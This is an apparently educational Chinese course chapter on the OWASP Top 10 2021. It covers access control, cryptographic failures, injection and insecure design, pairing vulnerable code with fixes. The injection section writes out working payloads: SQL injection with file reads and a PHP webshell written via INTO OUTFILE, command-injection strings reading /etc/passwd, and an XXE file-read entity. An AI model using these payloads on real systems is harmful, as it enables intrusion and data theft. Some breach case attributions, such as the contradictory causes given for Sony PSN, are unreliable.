# 第08章：Web安全与OWASP Top 10

> **难度**：⭐⭐⭐ (中级)  
> **预计时间**：90-120分钟  
> **课程编号**：08

---

## 📋 学习目标

完成本章学习后，您将能够：

1. **理解OWASP Top 10 2021版**的核心内容和演变历程
2. **识别和分析**十大致命Web应用安全风险
3. **掌握实战技能**：使用DVWA、WebGoat、Pikachu等平台进行漏洞测试
4. **学习防御措施**：了解每个漏洞的修复方案和最佳实践
5. **具备渗透测试思维**：从攻击者视角审视Web应用安全
6. **掌握漏洞原理**：深入理解SQL注入、XSS、SSRF等常见攻击手法
7. **学会安全编码**：在开发过程中避免常见安全陷阱

---

## 📚 背景知识

### 一、OWASP组织与Top 10项目的历史

#### 1.1 OWASP简介

**OWASP（Open Web Application Security Project，开放Web应用安全项目）** 是一个全球性的非盈利组织，致力于改善软件安全。该组织成立于2001年，由Mark Curphey和Dennis Groves创立，总部设在美国。

OWASP的核心理念是：**应用程序安全应该是开放的、透明的、实用的**。该组织通过以下方式推动Web安全发展：

- **开源工具开发**：如OWASP ZAP（渗透测试工具）、OWASP Dependency-Check（依赖检查工具）
- **安全知识库**：OWASP Top 10、OWASP Testing Guide、OWASP Cheat Sheet Series
- **社区活动**：全球会议（AppSec）、本地章节聚会、在线培训
- **标准制定**：参与制定Web应用安全标准（如ASVS - Application Security Verification Standard）

#### 1.2 OWASP Top 10的演变历程

OWASP Top 10项目始于**2003年**，每隔几年更新一次，反映了Web安全威胁的演变：

| 版本 | 发布年份 | 重要变化 |
|------|---------|---------|
| **2003** | 初版 | 定义了最初的10大Web风险 |
| **2004** | 第一次更新 | 调整了风险排序 |
| **2007** | 第二次更新 | 引入风险评级方法 |
| **2010** | 第三次更新 | 增加CSRF、不安全密码存储 |
| **2013** | 第四次更新 | 合并相似风险，引入"A9 - 使用含有已知漏洞的组件" |
| **2017** | 第五次更新 | 引入"A8 - 不安全的反序列化"、"A10 - 记录和监控不足" |
| **2021** | 第六次更新 | 重大调整：引入"CWE（Common Weakness Enumeration）视角"，重新分类 |

#### 1.3 2021版的重大变革

2021版是OWASP Top 10历史上**变化最大的一次更新**，主要革新包括：

1. **基于CWE的数据驱动方法**：
   - 以往版本主要依赖专家意见（"行业共识"）
   - 2021版分析了**超过500,000个应用程序**的漏洞数据
   - 使用NIST IR 8380标准进行风险评估

2. **新的风险分类逻辑**：
   - 从"症状"转向"根源"
   - 例如：A04:2021 - Insecure Design（不安全设计）是全新类别，关注架构层面的缺陷

3. **三个新进入Top 10的风险**：
   - A04:2021 - Insecure Design（不安全设计）
   - A08:2021 - Software and Data Integrity Failures（软件和数据完整性故障）
   - A10:2021 - Server-Side Request Forgery (SSRF)（服务端请求伪造）

4. **名称调整以更准确描述问题**：
   - A01:2021 - Broken Access Control（越权访问）- 原为"Access Control Issues"
   - A02:2021 - Cryptographic Failures（加密故障）- 原为"敏感数据暴露"
   - A07:2021 - Identification and Authentication Failures（身份认证失效）- 原为"认证和授权失败"

### 二、Web应用安全威胁的本质

#### 2.1 为什么Web应用成为攻击目标？

Web应用是现代互联网的**核心基础设施**，承载着关键业务和数据。攻击者瞄准Web应用的原因包括：

1. **高价值目标**：
   - 数据库包含用户凭证、信用卡信息、个人隐私
   - 业务逻辑漏洞可导致直接金钱损失（如支付绕过）
   - 供应链攻击的入口点（攻击一个应用可影响其所有用户）

2. **攻击面庞大**：
   - 现代Web应用依赖众多组件（框架、库、第三方API）
   - 每个组件都可能引入漏洞
   - 微服务架构增加了通信环节的攻击面

3. **技术复杂性**：
   - 前端（React/Vue/Angular）+ 后端（Java/Python/Node.js）+ 数据库（MySQL/MongoDB/Redis）
   - 每层都可能出现安全问题
   - 开发人员往往缺乏安全训练

4. **防御滞后**：
   - 安全往往被牺牲以换取开发速度
   - "先上线，后补安全"的思维普遍存在
   - 漏洞披露到补丁部署的时间窗口（"漏洞窗口期"）被攻击者利用

#### 2.2 Web安全的三大支柱

要系统理解Web安全，需要掌握三大支柱：

**1. 机密性（Confidentiality）**
- 确保数据只能被授权者访问
- 威胁：敏感数据泄露、越权访问
- 防御：加密、访问控制、最小权限原则

**2. 完整性（Integrity）**
- 确保数据未被未授权修改
- 威胁：SQL注入、参数篡改、中间件污染
- 防御：输入验证、参数化查询、数字签名

**3. 可用性（Availability）**
- 确保系统可被授权用户正常使用
- 威胁：DDoS攻击、资源耗尽、逻辑炸弹
- 防御：速率限制、负载均衡、容错设计

这三个目标构成**CIA三元组**，是信息安全的基石。OWASP Top 10的每一个风险都违反了至少一个CIA目标。

### 三、Web攻击的生命周期

理解攻击者的思维对于防御至关重要。典型的Web攻击遵循以下生命周期：

#### 3.1 信息收集（Reconnaissance）

**目标**：收集目标应用的尽可能多的信息

**技术手段**：
- **被动信息收集**：
  - Google Hacking：使用高级搜索语法（如`site:example.com filetype:pdf`）
  - WHOIS查询：获取域名注册信息
  - 社交媒体侦测：从GitHub、Stack Overflow等平台收集泄露的代码或配置
  - 子域名枚举：发现隐藏的管理后台或测试环境

- **主动信息收集**：
  - 端口扫描（Nmap）：识别开放的服务和版本
  - 目录爆破（Dirb/GoBuster）：发现隐藏的路径（如`/admin`、`/backup`）
  - 指纹识别：确定Web服务器（Apache/Nginx）、后端语言（PHP/Java）、框架（WordPress/Django）
  - HTTP头分析：检查`Server`、`X-Powered-By`等泄露信息的头

**防御视角**：
- 配置Web服务器隐藏版本信息
- 使用`robots.txt`和 meta 标签控制搜索引擎抓取
- 实施速率限制防止扫描
- 定期审计公开信息（如GitHub仓库是否泄露敏感数据）

#### 3.2 漏洞探测（Vulnerability Scanning）

**目标**：识别应用中的具体漏洞

**技术手段**：
- **自动化扫描**：
  - 使用OWASP ZAP、Burp Suite、Acunetix等工具
  - 爬虫发现所有入口点（URL、表单、API端点）
  - 注入测试payload（如`' OR 1=1 --`检测SQL注入）
  - 检测常见配置错误（如默认凭证、不必要的HTTP方法）

- **手动测试**：
  - 分析业务逻辑漏洞（如价格篡改、验证码绕过）
  - 测试认证和会话管理（如弱密码策略、会话固定）
  - 检查访问控制（如直接访问`/admin`页面）
  - 挖掘逻辑缺陷（如竞态条件、工作流程绕过）

**防御视角**：
- 部署WAF（Web Application Firewall）过滤常见攻击
- 实施输入验证和输出编码
- 使用参数化查询防止注入
- 定期进行渗透测试和代码审计

#### 3.3 漏洞利用（Exploitation）

**目标**：利用已发现的漏洞获取未授权访问或执行恶意操作

**常见利用技术**：
- **SQL注入利用**：
  - 使用`UNION SELECT`提取数据
  - 使用`LOAD_FILE()`读取系统文件
  - 使用`INTO OUTFILE`写入Webshell
  - 绕过认证（如`' OR '1'='1`作为密码）

- **XSS利用**：
  - 窃取Cookie（`<script>alert(document.cookie)</script>`）
  - 钓鱼攻击（伪造登录框）
  - 键盘记录（注入JavaScript键盘监听代码）
  - 网页篡改（修改DOM内容）

- **越权访问利用**：
  - 修改URL中的ID（如从`/user/profile/100`改为`/user/profile/101`）
  - 操纵JSON Web Token（JWT）的`alg`字段（"none"攻击）
  - 绕过基于URL的访问控制

**防御视角**：
- 使用预编译语句（Prepared Statement）
- 实施内容安全策略（CSP）
- 验证所有用户输入和服务器端状态
- 实施最小权限原则

#### 3.4 权限提升（Privilege Escalation）

**目标**：从低权限用户提升为高权限用户（如从普通用户到管理员）

**技术手段**：
- **横向越权**：访问同级别其他用户的数据
- **纵向越权**：访问更高权限的功能（如从用户到管理员）
- **利用不安全的直接对象引用（IDOR）**：
  - 修改订单ID查看他人订单
  - 修改发票ID查看他人发票
- **会话劫持**：
  - 预测会话ID（弱随机数生成）
  - 会话固定（Session Fixation）
  - 跨站请求伪造（CSRF）

**防御视角**：
- 实施严格的访问控制检查（每次访问都验证权限）
- 使用间接引用（如映射ID到内部标识符）
- 实施CSRF Token
- 安全会话管理（HttpOnly、Secure、SameSite Cookie属性）

#### 3.5 持久化与横向移动（Persistence & Lateral Movement）

**目标**：在目标系统中保持访问权限，并扩展到其他系统

**技术手段**：
- **植入后门**：
  - Webshell（如中国菜刀、冰蝎）
  - 计划任务（Cron Job）
  - 服务注入
- **凭据窃取**：
  - 从配置文件读取数据库密码
  - 从内存提取明文密码（如Mimikatz）
  - 从备份文件恢复敏感信息
- **内网渗透**：
  - 使用受损服务器作为跳板
  - 扫描内网其他服务（如Redis、Elasticsearch）
  - 利用信任关系横向移动

**防御视角**：
- 文件完整性监控（FIM）
- 网络分段和微隔离
- 最小权限原则（服务账户不应有过多权限）
- 定期轮转凭据

#### 3.6 数据窃取与影响（Data Exfiltration & Impact）

**目标**：窃取有价值数据并造成最大影响

**攻击场景**：
- **数据窃取**：
  - 批量导出用户数据库
  - 下载敏感文档（合同、设计图纸）
  - 窃取知识产权（源代码、算法）
- **破坏操作**：
  - 删除数据库（勒索软件前奏）
  - 篡改网站内容（ defacement）
  - 加密数据勒索赎金

**真实案例**：
- **Equifax数据泄露（2017）**：攻击者利用Apache Struts漏洞（CVE-2017-5638），窃取1.43亿用户的个人信息，包括SSN、信用卡号。根本原因：A06 - 易受攻击组件。
- **Capital One数据泄露（2019）**：攻击者利用服务器端请求伪造（SSRF）漏洞访问AWS元数据服务，窃取1亿信用卡申请数据。根本原因：A10 - SSRF。

**防御视角**：
- 数据加密（传输中、静态、使用中）
- 数据丢失防护（DLP）
- 安全监控和事件响应
- 定期备份和灾难恢复演练

### 四、Web安全测试方法

#### 4.1 黑盒测试（Black-Box Testing）

**定义**：测试者在**不了解内部代码结构**的情况下测试应用，模拟外部攻击者的视角。

**优点**：
- 真实反映外部攻击者的视角
- 不需要源代码
- 可以发现配置错误、逻辑漏洞

**缺点**：
- 覆盖率低（无法测试所有代码路径）
- 耗时较长
- 可能遗漏深层漏洞

**常用工具**：
- **Burp Suite**：拦截和修改HTTP请求
- **OWASP ZAP**：自动化漏洞扫描
- **Nmap**：端口扫描和服务识别
- **Nikto**：Web服务器配置审计

#### 4.2 白盒测试（White-Box Testing）

**定义**：测试者拥有**完整的源代码和架构信息**，进行深度代码审计。

**优点**：
- 高覆盖率（可以测试所有代码路径）
- 可以发现逻辑漏洞、后门
- 能够精确定位漏洞位置

**缺点**：
- 需要源代码访问权限
- 可能需要专业知识（如理解特定框架）
- 可能产生误报（需要人工验证）

**常用工具**：
- **SonarQube**：静态代码分析
- **SpotBugs**：Java代码审计
- **Bandit**：Python代码安全扫描
- **ESLint**：JavaScript代码质量检查

#### 4.3 灰盒测试（Grey-Box Testing）

**定义**：测试者拥有**部分信息**（如用户凭证、API文档），结合黑盒和白盒的优点。

**适用场景**：
- 测试认证和授权机制
- 测试特定用户角色的权限
- 测试业务流程（如购物、支付）

**方法**：
- 使用合法账户登录后测试越权访问
- 分析API文档寻找未公开端点
- 结合代码审计和动态测试

#### 4.4 渗透测试的标准流程

遵循**PTES（Penetration Testing Execution Standard）**或**OWASP Testing Guide**：

1. **前期交互（Pre-engagement）**：
   - 确定测试范围（哪些系统、哪些IP）
   - 确定规则（是否允许DoS、是否允许社会工程学）
   - 签署授权文件（避免法律责任）

2. **情报搜集（Intelligence Gathering）**：
   - 被动收集（搜索引擎、社交媒体）
   - 主动收集（DNS枚举、端口扫描）

3. **威胁建模（Threat Modeling）**：
   - 识别高价值资产（数据库、管理员账户）
   - 分析攻击路径（哪些漏洞最可能被利用）
   - 制定测试策略

4. **漏洞利用（Exploitation）**：
   - 验证漏洞是否可被利用
   - 评估漏洞的业务影响
   - 尝试提升权限

5. **后渗透（Post-Exploitation）**：
   - 评估攻击者可持续访问的时间
   - 识别横向移动路径
   - 评估数据窃取的可能性

6. **报告（Reporting）**：
   - 漏洞描述（包含PoC）
   - 风险评级（CVSS评分）
   - 修复建议（短期、长期）

### 五、法律与道德考量

#### 5.1 法律边界

**合法行为**：
- 获得书面授权的渗透测试
- 在自己的系统上测试
- 参与漏洞奖励计划（Bug Bounty）
- 教育环境中的合法实验

**违法行为**：
- 未授权访问他人系统
- 破坏、篡改、删除数据
- 窃取敏感信息
- 传播恶意软件

**中国法律**：
- **《网络安全法》（2017）**：禁止未经授权访问网络系统
- **《刑法》第285条**：非法侵入计算机信息系统罪
- **《刑法》第286条**：破坏计算机信息系统罪

#### 5.2 道德黑客的原则

1. **授权第一**：永远不要在没有明确授权的情况下测试
2. **不造成伤害**：避免导致系统不可用或数据丢失
3. **保密原则**：不泄露客户的敏感信息
4. **告知义务**：发现漏洞后及时通知相关方
5. **合法披露**：遵循负责任的漏洞披露流程（RVP）

#### 5.3 漏洞披露的最佳实践

**负责任披露（Responsible Disclosure）流程**：
1. 发现漏洞后，首先通知厂商
2. 给予厂商合理时间修复（通常90天）
3. 修复完成后公开披露
4. 如果厂商不修复，可考虑公开披露（但要匿名化敏感信息）

**不负责任披露的危害**：
- 给攻击者提供利用指南
- 损害厂商声誉
- 可能导致用户数据泄露

---

## 🔬 OWASP Top 10 2021 详解

### A01:2021 – Broken Access Control（越权访问）⭐⭐⭐⭐⭐

#### 漏洞描述

**越权访问**是2021版OWASP Top 10的**第一名**（从2017版的第5名跃升），是唯一一个在500,000+应用程序中出现率超过**94%**的风险类别。

**核心问题**：应用程序没有正确限制用户只能访问他们被授权的资源和操作。

#### 攻击场景

**场景1：横向越权（Horizontal Privilege Escalation）**

```
正常请求：
GET /api/v1/users/12345/orders

攻击请求：
GET /api/v1/users/12346/orders  ← 修改用户ID查看其他用户的订单
```

**场景2：纵向越权（Vertical Privilege Escalation）**

```
普通用户访问管理员功能：
GET /admin/users/list  ← 如果没有访问控制检查，普通用户也能访问
```

**场景3：不安全的直接对象引用（IDOR）**

```
修改URL参数访问未授权数据：
GET /invoice/download?invoice_id=1001
↓
GET /invoice/download?invoice_id=1002  ← 下载其他用户的发票
```

**场景4：JWT攻击**

```
原始JWT：
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user_id": 1001,
  "role": "user",
  "exp": 1735689600
}

攻击后的JWT（修改为管理员）：
{
  "user_id": 1001,
  "role": "admin",  ← 修改角色
  "exp": 1735689600
}
```

**场景5：缺失功能级访问控制**

```
前端隐藏了管理员按钮，但后端未验证：
POST /api/admin/deleteUser  ← 即使前端不显示，攻击者仍可直接调用
```

#### 技术细节

**1. 访问控制类型**

- **垂直访问控制**：限制高权限功能（如管理员操作）
- **水平访问控制**：限制同级别用户访问彼此的资源
- **上下文相关的访问控制**：限制工作流程顺序（如支付必须在下单之后）

**2. 常见错误模式**

- **仅依赖前端控制**：前端隐藏按钮，但后端未验证
- **Insecure Direct Object References (IDOR)**：直接使用数据库ID作为参数
- **缺失元数据访问控制**：如JWT、Cookie未设`HttpOnly`和`Secure`标志
- **CORS配置错误**：`Access-Control-Allow-Origin: *`允许任意域访问
- **强制浏览**：用户可以访问未授权的URL（如`/admin`）

**3. 检测方法**

- **手动测试**：
  - 修改URL参数（如ID、UUID）
  - 删除JWT中的`role`字段观察是否降级
  - 使用低权限账户访问高权限API

- **自动化工具**：
  - **Burp Suite Autorize插件**：自动检测越权访问
  - **OWASP ZAP**：访问控制测试

#### 防御措施

✅ **实施严格的访问控制检查**
```python
# 错误的做法（仅依赖前端隐藏）
@app.route('/admin/users')
def admin_users():
    return render_template('admin.html')  # 前端隐藏了链接，但后端未验证

# 正确的做法（后端验证）
@app.route('/admin/users')
@login_required
@role_required('admin')  # 装饰器验证角色
def admin_users():
    if current_user.role != 'admin':
        abort(403)  # Forbidden
    return render_template('admin.html')
```

✅ **使用间接引用**
```python
# 错误的做法（直接暴露数据库ID）
@app.route('/invoice/<int:invoice_id>')
def download_invoice(invoice_id):
    invoice = Invoice.query.get(invoice_id)
    return send_file(invoice.file_path)

# 正确的做法（使用UUID或映射表）
@app.route('/invoice/<uuid:invoice_uuid>')
def download_invoice(invoice_uuid):
    invoice = Invoice.query.filter_by(uuid=invoice_uuid, user_id=current_user.id).first()
    if not invoice:
        abort(403)
    return send_file(invoice.file_path)
```

✅ **实施最小权限原则**
- 数据库账户不应有`DROP TABLE`权限
- 服务账户不应有`root`权限
- 用户默认应为最低权限

✅ **启用日志和监控**
```python
import logging

@app.route('/admin/users')
@login_required
def admin_users():
    if current_user.role != 'admin':
        logging.warning(f'Unauthorized access attempt by user {current_user.id}')
        abort(403)
    # ...
```

✅ **配置CORS正确**
```python
# 错误的做法
CORS(app, resources={r"/*": {"origins": "*"}})

# 正确的做法
CORS(app, resources={r"/api/*": {"origins": "https://trusted-domain.com"}})
```

✅ **设置安全的Cookie属性**
```python
# Flask示例
app.config['SESSION_COOKIE_HTTPONLY'] = True  # 防止XSS读取Cookie
app.config['SESSION_COOKIE_SECURE'] = True    # 仅HTTPS传输
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # 防止CSRF
```

#### 真实案例

**1. Facebook IDOR漏洞（2021）**
- **漏洞**：攻击者可以查看任意用户的手机号码绑定的账户
- **影响**：5.33亿用户数据泄露
- **原因**：API未验证请求者是否有权访问目标用户的手机号

**2. Uber越权访问（2016）**
- **漏洞**：攻击者可以查看任意司机的个人信息
- **影响**：数百万司机数据泄露
- **原因**：`/driver/{driver_id}`端点未验证请求者的权限

---

### A02:2021 – Cryptographic Failures（加密故障）⭐⭐⭐⭐

#### 漏洞描述

**加密故障**（2017版称为"敏感数据暴露"）上升到第二名。这个类别关注**加密算法的错误使用**和**敏感数据的保护不足**。

**核心问题**：应用程序没有正确保护敏感数据（如密码、信用卡号、健康记录）。

#### 攻击场景

**场景1：传输层保护不足**

```
HTTP传输（明文）：
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "username": "admin",
  "password": "password123"  ← 明文传输，可被嗅探
}
```

**场景2：存储层保护不足**

```python
# 错误的做法（明文存储密码）
user.password = request.form['password']  # 明文
db.session.add(user)

# 更错误的做法（弱哈希）
import md5
user.password = md5.new(request.form['password']).hexdigest()  # MD5已被破解
```

**场景3：硬编码密钥**

```python
# 错误的做法
SECRET_KEY = "my-secret-key-12345"  # 硬编码在源代码中
JWT_SECRET = "super-secret-jwt-key"  # 提交到GitHub后泄露
```

**场景4：使用弱加密算法**

```python
# 错误的做法
from Crypto.Cipher import DES  # DES密钥长度仅56位，已被破解
cipher = DES.new(key, DES.MODE_ECB)
```

**场景5：随机性不足**

```python
# 错误的做法
import random
token = str(random.randint(1000, 9999))  # 可预测的随机数

# 正确的做法
import secrets
token = secrets.token_urlsafe(32)  # 加密安全的随机数
```

#### 技术细节

**1. 传输层保护**

- **TLS配置错误**：
  - 使用老旧协议（TLS 1.0/1.1）
  - 使用弱加密套件（如RC4、DES）
  - 证书验证被禁用（如Python `verify=False`）

- **混合内容（Mixed Content）**：
  - HTTPS页面加载HTTP资源
  - 可被中间人攻击（MITM）篡改

**2. 存储层保护**

- **密码存储**：
  - ❌ 禁止：明文、弱哈希（MD5、SHA1）、无盐哈希
  - ✅ 推荐：bcrypt、Argon2、scrypt、PBKDF2

- **数据加密**：
  - 静态数据加密（Data at Rest）：数据库加密、磁盘加密
  - 传输中数据加密（Data in Transit）：TLS 1.2+、证书锁定

**3. 密钥管理**

- **密钥生成**：使用加密安全的随机数生成器
- **密钥存储**：使用密钥管理系统（KMS）、HSM（硬件安全模块）
- **密钥轮换**：定期更换密钥
- **密钥分发**：禁止硬编码、禁止明文传输

#### 防御措施

✅ **使用强哈希算法存储密码**
```python
# 使用bcrypt（推荐）
from werkzeug.security import generate_password_hash, check_password_hash

# 哈希密码
password_hash = generate_password_hash('password123', method='pbkdf2:sha256:150000')

# 验证密码
check_password_hash(password_hash, 'password123')  # 返回True/False
```

✅ **强制使用HTTPS**
```python
# Flask强制HTTPS
from flask_talisman import Talisman
Talisman(app, force_https=True)

# Nginx配置
server {
    listen 443 ssl;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
}
```

✅ **使用安全的随机数生成器**
```python
import secrets

# 生成CSRF Token
csrf_token = secrets.token_urlsafe(32)

# 生成密码重置令牌
reset_token = secrets.token_hex(32)
```

✅ **加密敏感数据**
```python
from cryptography.fernet import Fernet

# 生成密钥（存储在安全位置，如环境变量）
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# 加密
encrypted_data = cipher_suite.encrypt(b"Sensitive Data")

# 解密
decrypted_data = cipher_suite.decrypt(encrypted_data)
```

✅ **防止敏感数据泄露在日志中**
```python
# 错误的做法
logging.info(f'User login: username={username}, password={password}')

# 正确的做法
logging.info(f'User login: username={username}')  # 不记录密码
```

✅ **使用内容安全策略（CSP）**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
```

#### 真实案例

**1. Sony PlayStation Network（2011）**
- **漏洞**：密码使用弱加密存储
- **影响**：7700万用户数据泄露
- **原因**：使用自定义加密算法而非标准算法

**2. LinkedIn密码泄露（2012）**
- **漏洞**：密码使用SHA1无盐哈希
- **影响**：1.67亿账户泄露
- **原因**：未使用自适应哈希函数（如bcrypt）

**3. Equifax（2017）**
- **漏洞**：数据库未加密
- **影响**：1.43亿用户SSN泄露
- **原因**：传输层和存储层均未加密

---

### A03:2021 – Injection（注入攻击）⭐⭐␐⭐⭐

#### 漏洞描述

**注入攻击**从2017版的第一名下降到第三名，但仍然是最危险的漏洞类别之一。注入攻击发生在**不可信数据被发送给解释器作为命令或查询的一部分**时。

**核心问题**：应用程序未正确验证、过滤或清洗用户输入，导致攻击者可以注入恶意代码。

#### 注入类型

**1. SQL注入（SQL Injection）**

最常见的注入类型，攻击者可以在SQL查询中注入恶意代码。

**攻击场景**：
```python
# 错误的做法（拼接SQL）
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)

# 攻击Payload：
username = "admin' --"
password = "anything"
# 最终查询：SELECT * FROM users WHERE username='admin' --' AND password='anything'
# "--"是SQL注释，密码检查被绕过
```

**进阶攻击**：
```sql
-- 使用UNION SELECT提取数据
' UNION SELECT username, password FROM users --

-- 使用LOAD_FILE()读取文件
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --

-- 使用INTO OUTFILE写入Webshell
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>' --
```

**2. NoSQL注入（NoSQL Injection）**

针对NoSQL数据库（如MongoDB、Redis）的注入攻击。

**攻击场景**：
```javascript
// 错误的做法（MongoDB）
const username = req.body.username;
const password = req.body.password;
db.users.findOne({ username: username, password: password });

// 攻击Payload（JSON注入）：
{
  "username": {"$gt": ""},  // 匹配所有用户名
  "password": {"$gt": ""}   // 匹配所有密码
}
// 最终查询：db.users.findOne({ username: {"$gt": ""}, password: {"$gt": ""} })
// 返回第一个用户（通常是管理员）
```

**3. 命令注入（Command Injection）**

攻击者可以在系统命令中注入恶意代码。

**攻击场景**：
```python
# 错误的做法（调用系统命令）
import os
filename = request.form['filename']
os.system(f"ping -c 4 {filename}")  # 未过滤输入

# 攻击Payload：
filename = "127.0.0.1; cat /etc/passwd"
# 最终命令：ping -c 4 127.0.0.1; cat /etc/passwd
# 分号（;）允许执行多条命令
```

**进阶攻击**：
```bash
# 使用管道（|）
127.0.0.1 | cat /etc/passwd

# 使用逻辑与（&&）
127.0.0.1 && cat /etc/passwd

# 使用反引号（`）
127.0.0.1 `cat /etc/passwd`

# 使用$(command)
127.0.0.1 $(cat /etc/passwd)
```

**4. LDAP注入（LDAP Injection）**

针对LDAP（轻量级目录访问协议）的注入攻击。

**攻击场景**：
```python
# 错误的做法
import ldap
conn = ldap.initialize('ldap://localhost')
username = request.form['username']
password = request.form['password']
conn.simple_bind_s(f"uid={username},ou=users,dc=example,dc=com", password)

# 攻击Payload：
username = "admin)(&"  # 绕过认证
# 最终DN：uid=admin)(&,ou=users,dc=example,dc=com
# LDAP过滤器被篡改
```

**5. XML注入（XML Injection）**

针对XML解析器的注入攻击，包括**XXE（XML External Entity）**攻击。

**攻击场景**：
```xml
<!-- 正常请求 -->
<?xml version="1.0"?>
<user>
  <username>admin</username>
  <password>password123</password>
</user>

<!-- XXE攻击 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>password123</password>
</user>
<!-- 服务器会用/etc/passwd的内容替换&xxe; -->
```

#### 防御措施

✅ **使用参数化查询（Prepared Statement）**
```python
# 错误的做法（拼接SQL）
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)

# 正确的做法（参数化查询）
query = "SELECT * FROM users WHERE username=%s"
cursor.execute(query, (username,))  # 参数作为元组传递
```

✅ **使用ORM框架**
```python
# 使用SQLAlchemy（Python）
from models import User
user = User.query.filter_by(username=username).first()

# 使用Django ORM
from django.contrib.auth.models import User
user = User.objects.get(username=username)
```

✅ **输入验证和白名单**
```python
import re

# 验证用户名（仅允许字母和数字）
if not re.match(r'^[a-zA-Z0-9]+$', username):
    return "Invalid username", 400

# 验证邮箱
if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
    return "Invalid email", 400
```

✅ **避免动态查询**
```python
# 错误的做法
sort_by = request.args.get('sort_by')
query = f"SELECT * FROM users ORDER BY {sort_by}"  # 可注入

# 正确的做法（白名单）
allowed_columns = ['id', 'username', 'email']
if sort_by not in allowed_columns:
    sort_by = 'id'
query = f"SELECT * FROM users ORDER BY {sort_by}"
```

✅ **使用存储过程**
```sql
-- 定义存储过程
CREATE PROCEDURE GetUserByUsername(IN p_username VARCHAR(50))
BEGIN
    SELECT * FROM users WHERE username = p_username;
END

-- 调用存储过程（参数化）
CALL GetUserByUsername(?);
```

✅ **最小化数据库权限**
```sql
-- 错误的做法（授予所有权限）
GRANT ALL PRIVILEGES ON database.* TO 'app_user'@'localhost';

-- 正确的做法（最小权限）
GRANT SELECT, INSERT, UPDATE ON database.users TO 'app_user'@'localhost';
```

✅ **防止命令注入**
```python
# 错误的做法
os.system(f"ping -c 4 {hostname}")

# 正确的做法（使用shlex.quote转义）
import shlex
os.system(f"ping -c 4 {shlex.quote(hostname)}")

# 更好的做法（使用subprocess with list）
import subprocess
subprocess.run(["ping", "-c", "4", hostname], check=True)
```

✅ **防止XXE**
```python
# Python（defusedxml）
from defusedxml import ElementTree
tree = ElementTree.parse(xml_file)

# Java（禁用外部实体）
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

#### 真实案例

**1. Sony PlayStation Network（2011）**
- **漏洞**：SQL注入
- **影响**：7700万用户数据泄露
- **原因**：未使用参数化查询

**2. Yahoo数据泄露（2013）**
- **漏洞**：SQL注入
- **影响**：30亿账户泄露
- **原因**：未过滤用户输入

**3. Equifax（2017）**
- **漏洞**：Struts2 OGNL表达式注入（CVE-2017-5638）
- **影响**：1.43亿用户数据泄露
- **原因**：未更新框架版本

---

### A04:2021 – Insecure Design（不安全设计）⭐⭐⭐

#### 漏洞描述

**不安全设计**是2021版**新引入的类别**，关注**架构和设计层面的缺陷**，而非实现层面的错误。

**核心问题**：应用程序的架构设计存在根本性缺陷，导致安全措施无法有效实施。

#### 设计缺陷示例

**1. 缺失威胁建模**

在设计阶段未考虑潜在攻击场景。

**错误设计**：
- 未识别高价值资产（如用户数据库、管理员功能）
- 未分析攻击面（如API端点、文件上传功能）
- 未考虑威胁代理（如外部攻击者、内部威胁）

**正确设计**：
- 实施**STRIDE威胁建模**（Spoofing、Tampering、Repudiation、Information Disclosure、Denial of Service、Elevation of Privilege）
- 绘制数据流图（DFD）
- 制定安全需求（如"所有密码必须使用bcrypt哈希"）

**2. 不安全的业务流程**

业务流程逻辑存在缺陷，可被攻击者绕过。

**攻击场景**（电商价格篡改）：
```
1. 用户添加商品到购物车（价格$100）
2. 用户提交订单
3. 攻击者拦截请求，修改价格为$1
4. 服务器未验证价格，接受$1的支付
```

**防御设计**：
- 服务器端维护价格状态
- 支付前重新验证价格
- 使用数字签名保护关键参数

**3. 不安全的信任边界**

错误地信任来自不可信源的数据。

**攻击场景**（信任客户端验证）：
```javascript
// 前端验证（可被绕过）
function validateAge() {
    const age = document.getElementById('age').value;
    if (age < 18) {
        alert('You must be 18+ to register');
        return false;
    }
    return true;
}

// 攻击者禁用JavaScript或直接发送HTTP请求，绕过验证
```

**正确设计**：
- 所有验证必须在服务器端进行
- 客户端验证仅用于用户体验，不能替代服务器端验证

**4. 不安全的密码恢复机制**

密码恢复流程存在设计缺陷。

**攻击场景**（基于知识的验证问题）：
```
1. 用户点击"忘记密码"
2. 系统询问"你母亲的 maiden name 是什么？"
3. 攻击者通过社交媒体轻易获取答案
4. 攻击者重置密码
```

**正确设计**：
- 使用多因素认证（MFA）
- 发送一次性密码（OTP）到注册邮箱/手机
- 设置密码重置链接的有效期（如15分钟）

**5. 不安全的会话管理**

会话管理机制存在设计缺陷。

**攻击场景**（会话固定）：
```
1. 攻击者访问登录页面，获取会话ID（如PHPSESSID=abc123）
2. 攻击者诱导受害者使用此会话ID（如http://example.com/login?PHPSESSID=abc123）
3. 受害者登录后，攻击者使用相同的会话ID访问账户
```

**正确设计**：
- 登录后生成新的会话ID
- 使用`session_regenerate_id()`（PHP）
- 实施会话超时

#### 防御措施

✅ **实施威胁建模**
- 在设计阶段识别威胁
- 使用STRIDE或PASTA方法论
- 定期更新威胁模型

✅ **采用安全设计模式**
- **零信任架构（Zero Trust）**：不信任任何用户或设备，即使在内网
- **最小权限原则**：仅授予必要的权限
- **深度防御（Defense in Depth）**：多层安全控制

✅ **安全开发生命周期（SDLC）**
```
需求分析 → 设计 → 开发 → 测试 → 部署 → 维护
